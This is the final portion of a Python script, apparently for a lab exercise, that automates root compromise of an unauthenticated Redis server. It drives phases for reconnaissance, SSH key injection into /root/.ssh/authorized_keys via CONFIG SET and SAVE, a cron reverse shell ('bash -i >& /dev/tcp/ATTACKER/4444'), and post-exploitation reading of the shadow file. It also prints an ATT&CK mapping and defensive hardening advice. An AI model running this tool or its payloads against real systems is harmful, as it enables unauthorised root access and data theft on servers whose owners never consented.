        f"  Duration           : {str(duration).split('.')[0]}\n"
        f"  Target             : [yellow]{STATE['victim_ip']}:{STATE['redis_port']}[/yellow]\n"
        f"  Service            : Redis [bold]{redis_ver}[/bold]\n"
        f"  Vulnerability      : [bold red]Misconfiguration (No Auth + CONFIG Allowed)[/bold red]\n"
        f"  CVE                : [dim]N/A (misconfiguration, not a software bug)[/dim]\n"
        f"  Unauth Access      : {'[bold green]Confirmed[/bold green]' if unauth else '[yellow]Not confirmed[/yellow]'}\n"
        f"  Method 1 (SSH Key) : {'[bold red]ROOT ACCESS[/bold red]' if method1 else '[yellow]Failed / Skipped[/yellow]'}\n"
        f"  Method 2 (Cron)    : {'[bold red]ROOT ACCESS[/bold red]' if method2 else '[yellow]Failed / Skipped[/yellow]'}\n"
        f"  Root Achieved      : {'[bold red]YES[/bold red]' if (method1 or method2) else '[yellow]No[/yellow]'}",
        title="[bold green]OPERATION SUMMARY[/bold green]",
        border_style="bold green",
        padding=(1, 4),
    ))
    console.print()

    # Attack timeline
    console.rule("[bold blue]Attack Chain Timeline[/bold blue]", style="blue")
    tlt = Table(box=box.SIMPLE_HEAD)
    tlt.add_column("Phase", style="cyan", width=10)
    tlt.add_column("Name", style="white", width=34)
    tlt.add_column("Technique", style="dim")
    tlt.add_column("Result", width=10)
    timeline = [
        ("Phase 1", "Reconnaissance",              "nmap port scan, service fingerprint",
         "[bold green]OK[/bold green]"),
        ("Phase 2", "Unauthenticated Access",      "PING, INFO, CONFIG GET, DBSIZE",
         "[bold green]OK[/bold green]" if unauth else "[yellow]??[/yellow]"),
        ("Phase 3", "SSH Key Injection",            "CONFIG SET dir/dbfilename + SAVE",
         "[bold green]OK[/bold green]" if method1 else "[yellow]--[/yellow]"),
        ("Phase 4", "Cron Reverse Shell",           "CONFIG SET dir + cron payload + SAVE",
         "[bold green]OK[/bold green]" if method2 else "[yellow]--[/yellow]"),
        ("Phase 5", "Post-Exploitation",            "Root enumeration, shadow, flag file",
         "[bold green]OK[/bold green]" if STATE["loot"].get("post_exploit") else "[yellow]--[/yellow]"),
    ]
    for phase, name, detail, result in timeline:
        tlt.add_row(phase, name, detail, result)
    console.print(Padding(tlt, (0, 2)))
    console.print()

    # Kill chain diagram
    console.rule("[bold yellow]Kill Chain Flow[/bold yellow]", style="yellow")
    console.print("""
  [cyan]Attacker[/cyan] scans for open Redis port (6379)
      |
      v
  [cyan]Attacker[/cyan] connects to Redis -- no password required
      |
      v
  [cyan]Attacker[/cyan] runs INFO, CONFIG GET -- full access confirmed
      |
      v
  [yellow]Method 1: SSH Key Injection[/yellow]
      |   SET crackit "<padded-ssh-pubkey>"
      |   CONFIG SET dir /root/.ssh
      |   CONFIG SET dbfilename authorized_keys
      |   SAVE
      |
      v
  [red]SSH as root[/red] with injected private key
      |
      v
  [yellow]Method 2: Cron Reverse Shell (Backup)[/yellow]
      |   SET cron "*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
      |   CONFIG SET dir /var/spool/cron/crontabs
      |   CONFIG SET dbfilename root
      |   SAVE
      |
      v
  [red]Root reverse shell[/red] via cron execution
      |
      v
  [bold red]FULL ROOT ACCESS on victim[/bold red]
    """)

    # MITRE ATT&CK
    console.rule("[bold white]MITRE ATT&CK Coverage[/bold white]", style="white")
    mt = Table(box=box.SIMPLE, title="Techniques Used")
    mt.add_column("Tactic", style="magenta", width=22)
    mt.add_column("Technique ID", style="cyan", width=14)
    mt.add_column("Technique Name", style="white")
    for tactic, tid, name in MITRE:
        mt.add_row(tactic, tid, name)
    console.print(Padding(mt, (0, 2)))
    console.print()

    # Defensive recommendations
    console.rule("[bold green]Blue Team Defensive Recommendations[/bold green]", style="green")
    recs = [
        ("T1190",     "Set 'requirepass <strong-password>' in redis.conf"),
        ("T1190",     "Bind Redis to 127.0.0.1 or internal interface only (bind 127.0.0.1)"),
        ("T1190",     "Enable protected-mode (protected-mode yes) -- default in Redis 3.2+"),
        ("T1190",     "Firewall port 6379 -- never expose Redis to untrusted networks"),
        ("T1098.004", "Disable dangerous commands via 'rename-command CONFIG \"\"'"),
        ("T1098.004", "Disable FLUSHALL, FLUSHDB, DEBUG, SAVE via rename-command"),
        ("T1053.003", "Run Redis as a dedicated unprivileged user, NEVER as root"),
        ("T1053.003", "Use SELinux/AppArmor to restrict Redis file write paths"),
        ("T1552.001", "Audit Redis ACLs (Redis 6.0+) to enforce least-privilege access"),
        ("All",       "Monitor Redis logs for CONFIG SET commands and unexpected SAVE operations"),
        ("All",       "Use Redis 7.x+ which disables protected config changes by default"),
        ("All",       "Deploy network segmentation -- Redis should not be reachable from attack surface"),
    ]
    for tid, rec in recs:
        console.print(f"  [green]>[/green] [dim][{tid}][/dim] {rec}")
    console.print()

    # Final impact
    console.print(Panel(
        "[bold red]IMPACT SUMMARY[/bold red]\n\n"
        "  A misconfigured Redis instance with [bold]no authentication[/bold] allowed an\n"
        "  attacker to achieve [bold red]root-level code execution[/bold red] by abusing the\n"
        "  CONFIG SET command to write arbitrary files to the filesystem.\n\n"
        "  [bold]No credentials were needed to connect to Redis.[/bold]\n"
        "  [bold]No software vulnerability was exploited -- this is pure misconfiguration.[/bold]\n"
        "  [bold]Redis running as root amplified the impact to full system compromise.[/bold]\n\n"
        "  Two independent exploitation methods were demonstrated:\n"
        "    1. SSH public key injection into /root/.ssh/authorized_keys\n"
        "    2. Cron job reverse shell via /var/spool/cron/crontabs/root\n\n"
        "  [dim]Both methods abuse the same primitive: Redis CONFIG SET + SAVE = arbitrary file write.[/dim]",
        title="[bold red]REDIS MISCONFIGURATION -- FULL SYSTEM COMPROMISE[/bold red]",
        border_style="bold red",
        padding=(1, 4),
    ))
    console.print()

# ---------------------------------------------------------------------------
#  Cleanup
# ---------------------------------------------------------------------------

def cleanup():
    """Remove generated SSH keys, kill listener, reset Redis state."""
    console.print()
    step("CLN", "Cleaning up attack artifacts")

    # Remove SSH keys
    for f in [STATE["ssh_key_path"], STATE["ssh_pubkey_path"]]:
        if os.path.exists(f):
            os.remove(f)
            ok(f"Removed {f}")

    # Kill listener process
    proc = STATE.get("listener_proc")
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
        ok(f"Terminated listener process (PID {proc.pid})")

    # Try to clean up Redis keys
    victim = STATE.get("victim_ip")
    port = STATE.get("redis_port")
    if victim and port:
        try:
            redis_cli(victim, port, "FLUSHALL")
            redis_cli(victim, port, "CONFIG", "SET", "dir", "/var/lib/redis")
            redis_cli(victim, port, "CONFIG", "SET", "dbfilename", "dump.rdb")
            ok("Reset Redis dir and dbfilename to defaults, flushed keys")
        except Exception:
            warn("Could not reset Redis state")

    console.print()

# ---------------------------------------------------------------------------
#  Main
# ---------------------------------------------------------------------------

def main():
    banner()
    configure()

    console.print(Panel(
        "  [cyan]Phase 1[/cyan]  Reconnaissance                (port scan, service fingerprint)\n"
        "  [cyan]Phase 2[/cyan]  Unauthenticated Access         (PING, INFO, CONFIG, DBSIZE)\n"
        "  [cyan]Phase 3[/cyan]  SSH Key Injection (Method 1)   (write pubkey via CONFIG SET)\n"
        "  [cyan]Phase 4[/cyan]  Cron Reverse Shell (Method 2)  (write cron job via CONFIG SET)\n"
        "  [cyan]Phase 5[/cyan]  Post-Exploitation              (root enum, shadow, flag)\n"
        "  [cyan]Phase 6[/cyan]  Report & ATT&CK Mapping",
        title="[bold]Attack Chain Overview[/bold]",
        border_style="blue",
    ))
    console.print()

    phases = [
        ("Reconnaissance",              phase_recon),
        ("Unauthenticated Access",      phase_unauth_access),
        ("SSH Key Injection",           phase_ssh_key_injection),
        ("Cron Reverse Shell",          phase_cron_shell),
        ("Post-Exploitation",           phase_post_exploit),
        ("Report",                      phase_report),
    ]

    try:
        for i, (name, func) in enumerate(phases, 1):
            try:
                func()
                if i < len(phases):
                    if not Confirm.ask(
                        f"\n  [bold cyan]Phase {i} ({name}) complete. Continue to Phase {i+1}?[/bold cyan]",
                        default=True,
                    ):
                        info("Skipping remaining phases, jumping to report...")
                        phase_report()
                        break
            except KeyboardInterrupt:
                console.print(f"\n[yellow]Phase {i} ({name}) interrupted.[/yellow]")
                if not Confirm.ask("  Continue to next phase?", default=True):
                    break
            except Exception as exc:
                err(f"Phase {i} ({name}): {exc}")
                console.print_exception(show_locals=False)
                if not Confirm.ask("  Continue despite error?", default=True):
                    break
    finally:
        console.print()
        if Confirm.ask("  [bold]Clean up attack artifacts (SSH keys, listener, Redis state)?[/bold]",
                       default=True):
            cleanup()
            ok("Cleanup complete")
        else:
            info("Artifacts left in place -- clean up manually when done")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Aborted.[/red]")
        cleanup()
        sys.exit(1)
